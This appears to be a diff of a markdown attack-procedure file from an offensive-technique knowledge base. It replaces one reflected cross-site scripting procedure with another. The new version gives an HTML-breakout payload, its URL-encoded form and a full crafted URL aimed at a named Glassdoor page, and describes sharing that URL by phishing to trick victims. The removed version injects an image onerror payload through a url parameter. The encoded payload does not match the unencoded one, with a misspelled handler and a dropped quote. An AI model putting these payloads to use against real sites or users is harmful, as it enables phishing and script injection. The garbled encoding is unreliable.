@@ -1,25 +1,26 @@
 ---
-id: proc-uuid-2
 tags:
   - xss
-  - javascript
-  - injection
+  - payload-injection
+  - url-manipulation
 type: procedure
 tools: []
 tactics:
   - '[[Execution]]'
+commands: []
 verified: false
 platforms:
   - Web
 submitted: true
-created_at: '2023-10-01T00:00:00Z'
+created_at: '2024-10-01T00:00:00Z'
 techniques:
   - '[[JavaScript]]'
-updated_at: '2025-12-14T03:46:26.531Z'
-skill_level: intermediate
-impact_level: high
-detection_risk: medium
+updated_at: '2025-12-14T17:26:22.219Z'
+skill_level: beginner
+impact_level: medium
+detection_risk: low
 sub_techniques: []
+id: e4cc8f0e-2ee5-4b64-983e-36004f6b26b9
 validated: true
 mitre_tactics:
   - '[[Execution]]'
@@ -30,49 +31,49 @@ mitre_techniques:
 
 ## Summary
 
-This procedure exploits a reflected XSS vulnerability by injecting a malicious JavaScript payload into the path of a user-supplied URL, causing the server to fetch and render it unsanitized, leading to script execution in the victim's browser.
+This procedure crafts a malicious URL by injecting a URL-encoded JavaScript payload into the path parameter of the Glassdoor FAQ page, exploiting the lack of sanitization to prepare for reflected execution.
 
 ## Description
 
-The vulnerability arises when a web server fetches content from a user-controlled URL and renders the path directly into the HTML response without escaping. By embedding an XSS payload like an onerror handler in an img tag within the path, the script executes upon rendering. This was demonstrated on an endpoint like https://█████/████&url=, where the path triggers JavaScript via XMLHttpRequest responses.
+The vulnerability stems from the server reflecting the URL path directly into the page without encoding or validation. By inserting a payload like `""><img onerror="><img src=x onerror=alert`1`">` after 'Mic' in 'Microsoft', the attacker breaks out of the expected HTML attribute and injects executable script. This step focuses on constructing the tampered URL, which can then be shared via phishing to trick victims into loading it.
 
 ## Requirements
 
-1. Identified vulnerable endpoint from prior reconnaissance
-2. Ability to craft and submit HTTP requests with custom URLs
-3. Victim access to the rendered page (authenticated session enhances impact)
+1. Knowledge of the base vulnerable URL.
+2. URL encoding tools or manual encoding skills.
+3. Target browser for testing (though not executed here).
 
 ## Defense
 
 Defensive measures and detection strategies:
 
-- Sanitize and escape all user-supplied content before rendering
-- Implement strict URL path validation and stripping of script tags
-- Use browser security headers like CSP to block inline scripts
+- Encode all URL path components before rendering in HTML.
+- Validate path parameters against whitelists.
+- Log and alert on unusual path lengths or characters.
 
 ## Objectives
 
-1. Inject and execute arbitrary JavaScript
-2. Confirm XSS without direct CSRF capability
-3. Set up for chaining with UI manipulation techniques
+1. Create a functional injected URL with encoded payload.
+2. Ensure the payload breaks HTML context for execution.
+3. Prepare URL for distribution or direct testing.
 
 ## Instructions
 
-### Step 1: Craft Malicious URL
+### Step 1: Encode and Insert Payload
 
-**Context**: Build a URL with an XSS payload in the path to exploit rendering flaws.
+**Context**: Manually construct the modified URL by URL-encoding the XSS payload and inserting it into the path.
 
-No command; manually construct: http://galnagli.com/<img src=x onerror=alert(document.domain)> as the url parameter value.
+The payload to encode: `"><img onerror="><img src=x onerror=alert`1`">`
 
-> This payload uses an invalid src to trigger onerror, executing the alert on the current domain.
+Encoded version: `%22%3e%3cimg%20onerro%3d%3e%3cimg%20src%3dx%20onerror%3dalert%601%60%3e`
 
-### Step 2: Submit and Verify Execution
+Construct the full URL:
 
-**Context**: Send the payload via the vulnerable endpoint and observe browser behavior.
+```url
+https://www.glassdoor.co.in/FAQ/Mic%22%3e%3cimg%20onerro%3d%3e%3cimg%20src%3dx%20onerror%3dalert%601%60%3erosoft-Question-FAQ200086-E1651.htm?countryRedirect=true
+```
 
-Submit via GET: https://█████/████&url=http://galnagli.com/<img src=x onerror=alert(document.domain)>. Load the response in a browser.
-
-> Expected output: Alert box pops up showing the domain, confirming JS execution.
+> Verify the encoding using a tool like an online URL encoder. The insertion point is after 'Mic' to close any open attributes.
 
 ## MITRE ATT&CK Mapping
 
@@ -96,5 +97,5 @@ Submit via GET: https://█████/████&url=http://galnagli.com/<im
 ## Tags
 
 - [[xss]]
-- [[JavaScript]]
-- [[injection]]
+- [[payload-injection]]
+- [[url-manipulation]]
